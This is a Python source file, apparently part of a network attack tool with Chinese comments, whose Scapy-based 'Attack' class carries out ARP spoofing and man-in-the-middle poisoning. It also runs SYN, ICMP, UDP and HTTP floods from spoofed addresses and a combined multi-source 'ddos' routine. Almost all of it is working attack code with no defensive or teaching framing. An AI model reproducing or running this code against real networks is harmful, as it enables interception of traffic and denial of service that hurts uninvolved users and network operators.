from scapy.layers.l2 import *
from scapy.layers.inet import *
from scapy.all import *
from scapy.layers.http import *
from time import sleep
import threading
from config import Config
from save import Save


class Attack:
    def __init__(self):
        self._nw_if = None
        self._mac = None
        self._ip = None
        self._ip_mac = {}
        self._scan_ip_no_use = None
        self._arp_threads = []
        self._dos_threads = []
        self._max_thread = 2
        return

    def init(self, config: Config, save: Save):
        self._nw_if = config.adp
        self._mac = config.mac
        self._ip = config.ip
        self._ip_mac = save.ip_mac
        self._scan_ip_no_use = save.scan_ip_no_use

    def _async_raise(self, tid, exc_type):
        """raises the exception, performs cleanup if needed"""
        tid = ctypes.c_long(tid)
        if not inspect.isclass(exc_type):
            exc_type = type(exc_type)
        res = ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, ctypes.py_object(exc_type))
        if res == 0:
            raise ValueError("invalid thread id")
        elif res != 1:
            # """if it returns a number greater than one, you're in trouble,
            # and you should call it again with exc=NULL to revert the effect"""
            ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, None)
            raise SystemError("PyThreadState_SetAsyncExc failed")

    # 杀死线程模块
    def stop_thread(self, thread):
        self._async_raise(thread.ident, SystemExit)

    def get_mac(self, ip_a: str, ip_b: str):
        if ip_a in self._ip_mac.keys():
            mac_a = self._ip_mac[ip_a]
        else:
            mac_a = "00:00:00:00:00:01"
        if ip_b in self._ip_mac.keys():
            mac_b = self._ip_mac[ip_b]
        else:
            mac_b = "00:00:00:00:00:01"
        return mac_a, mac_b

    def declare(self, ip_a: str, ip_b: str, mac_src: str):
        a_mac, b_mac = self.get_mac(ip_a, ip_b)
        sendp(Ether(src=mac_src, dst=a_mac) /
              ARP(psrc=ip_b, hwsrc=mac_src, hwdst=a_mac, pdst=ip_a, op="is-at"),
              inter=0.1, iface=self._nw_if, verbose=0, loop=1)

    # 欺骗ip_victim
    def arp_single_attack(self, ip_victim: str, ip_victim2: str):
        cut_off = threading.Thread(target=self.declare, args=(ip_victim, ip_victim2, self._mac))
        cut_off.start()
        self._arp_threads.append(cut_off)

    def arp_double_attack(self, ip_victim: str, ip_victim2: str):
        cheat_one = threading.Thread(target=self.declare, args=(ip_victim, ip_victim2, self._mac))
        cheat_two = threading.Thread(target=self.declare, args=(ip_victim2, ip_victim, self._mac))
        cheat_one.start()
        cheat_two.start()
        self._arp_threads.append(cheat_one)
        self._arp_threads.append(cheat_two)

    def tcp_first(self, ip_fake: str, ip_attack: str, port: int):
        mac_attack = self._ip_mac[ip_attack]
        sendp(Ether(src=self._mac, dst=mac_attack) /
              IP(src=ip_fake, dst=ip_attack) /
              TCP(sport=RandShort(), dport=port, flags="S"),
              iface=self._nw_if, verbose=0, loop=1)

    def syn_flood(self, ip_attack: str, port: int):
        self.stop_all()
        if self._scan_ip_no_use:
            # index = input("输入攻击实例")
            ip_can_attack = self._scan_ip_no_use[0]
        else:
            raise Exception("没有可用攻击主机ip")
        # 声明伪装ip的mac地址
        new = threading.Thread(target=self.declare, args=(ip_attack, ip_can_attack, "00:00:00:00:00:01"))
        self._arp_threads.append(new)
        # 发送请求包
        for i in range(0, self._max_thread):
            new = threading.Thread(target=self.tcp_first, args=(ip_can_attack, ip_attack, port))
            self._dos_threads.append(new)
        self.start_all()

    def icmp_first(self, ip_fake: str, ip_attack: str):
        mac_attack = self._ip_mac[ip_attack]
        sendp(Ether(src=mac_attack, dst="ff:ff:ff:ff:ff:ff") /
              IP(src=ip_fake, dst=ip_attack) /
              ICMP(), inter=0.1, iface=self._nw_if, verbose=0, loop=1)

    def icmp_flood(self, ip_attack: str):
        self.stop_all()
        if self._scan_ip_no_use:
            ip_can_attack = self._scan_ip_no_use[0]
        else:
            raise Exception("没有可用攻击主机ip")
        # 声明伪装ip的mac地址
        new = threading.Thread(target=self.declare, args=(ip_attack, ip_can_attack, "00:00:00:00:00:01"))
        self._arp_threads.append(new)
        for i in range(0, self._max_thread):
            # 发送请求包
            new = threading.Thread(target=self.icmp_first, args=(ip_can_attack, ip_attack))
            self._dos_threads.append(new)
        self.start_all()

    def udp_first(self, ip_fake: str, ip_attack: str, port: int):
        mac_attack = self._ip_mac[ip_attack]
        sendp(Ether(src=self._mac, dst=mac_attack) /
              IP(src=ip_fake, dst=ip_attack) /
              UDP(sport=RandShort(), dport=port),
              inter=0.5, iface=self._nw_if, verbose=0, loop=1)

    def udp_flood(self, ip_attack: str, port: int):
        self.stop_all()
        if self._scan_ip_no_use:
            ip_can_attack = self._scan_ip_no_use[0]
        else:
            raise Exception("没有可用攻击主机ip")
        # 声明伪装ip的mac地址
        new = threading.Thread(target=self.declare, args=(ip_attack, ip_can_attack, "00:00:00:00:00:01"))
        self._arp_threads.append(new)
        for i in range(0, self._max_thread):
            # 发送请求包
            new = threading.Thread(target=self.udp_first, args=(ip_can_attack, ip_attack, port))
            self._dos_threads.append(new)
        self.start_all()

    def whole_tcp(self, ip_can_attack: str, ip_attack: str, port: int):
        # ip_can_attack = self._scan_ip_no_use[0]
        srport = int(RandShort())
        seq = 0
        ack = 0
        mac_s, mac_r = self.get_mac(ip_can_attack, ip_attack)
        ans, un_an = srp(Ether(src=mac_s, dst=mac_r) /
                         IP(src=ip_can_attack, dst=ip_attack) /
                         TCP(sport=srport, dport=port, flags="S", seq=seq, window=65535),
                         inter=0.1, iface=self._nw_if, timeout=2, verbose=0)
        sleep(0.5)
        for s, r in ans:
            ack = r[TCP].seq + 1
        seq = seq + 1
        sendp(Ether(src=mac_s, dst=mac_r) /
              IP(src=ip_can_attack, dst=ip_attack) /
              TCP(sport=srport, dport=port, flags="A", ack=ack, seq=seq, window=65535),
              inter=0.1, iface=self._nw_if, verbose=0)
        sendp(Ether(src=mac_s, dst=mac_r) /
              IP(src=ip_can_attack, dst=ip_attack) /
              TCP(sport=srport, dport=port, flags="A", ack=ack, seq=seq, window=65535)
              / HTTP()
              /
              HTTPRequest(
                  Method="GET",
                  Http_Version="HTTP/1.1",
                  Host=ip_attack + ":" + str(port),
                  Connection="keep-alive",
                  Upgrade_Insecure_Requests="1",
                  User_Agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
                             "Chrome/77.0.3865.90 Safari/537.36",
                  Accept="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;"
                         "q=0.8,application/signed-exchange;v=b3",
                  # Accept_Encoding="gzip, deflate",
                  Accept_Language="zh,zh-TW;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6"
              ),
              inter=0.1, iface=self._nw_if, verbose=0)

    def whole_flood(self, ip_attack: str, port: int):
        self.stop_all()
        if self._scan_ip_no_use:
            ip_can_attack = self._scan_ip_no_use[0]
        else:
            raise Exception("没有可用攻击主机ip")
        # 声明伪装ip的mac地址
        new = threading.Thread(target=self.declare, args=(ip_attack, ip_can_attack, "00:00:00:00:00:01"))
        self._arp_threads.append(new)
        for i in range(0, self._max_thread):
            # 发送请求包
            new = threading.Thread(target=self.whole_tcp, args=(ip_can_attack, ip_attack, port))
            self._dos_threads.append(new)
        self.start_all()

    def ddos(self, ip_attack: str, t_port: int, u_port: int):
        # self.stop_all()
        if not self._scan_ip_no_use:
            raise Exception("没有可用攻击主机ip")
        for value in self._scan_ip_no_use:
            ip_can_attack = value
            # 声明伪装ip的mac地址
            new = threading.Thread(target=self.declare, args=(ip_attack, ip_can_attack, "00:00:00:00:00:01"))
            self._arp_threads.append(new)
            # 发送请求包
            one = threading.Thread(target=self.udp_first, args=(ip_can_attack, ip_attack, u_port))
            self._dos_threads.append(one)
            # 发送请求包
            two = threading.Thread(target=self.icmp_first, args=(ip_can_attack, ip_attack))
            self._dos_threads.append(two)
            # 发送请求包
            three = threading.Thread(target=self.tcp_first, args=(ip_can_attack, ip_attack, t_port))
            self._dos_threads.append(three)
        self.start_all()

    def start_all(self):
        new = threading.Thread(target=self._start_thread)
        new.start()

    def _start_thread(self):
        if self._arp_threads:
            for value in self._arp_threads:
                value.start()
        if self._dos_threads:
            for value in self._dos_threads:
                value.start()

    def stop_all(self):
        if self._arp_threads:
            for value in self._arp_threads:
                self.stop_thread(value)
                # self._arp_threads.pop(self._arp_threads.index(value))
        if self._dos_threads:
            for value in self._dos_threads:
                self.stop_thread(value)
                # self._dos_threads.pop(self._dos_threads.index(value))
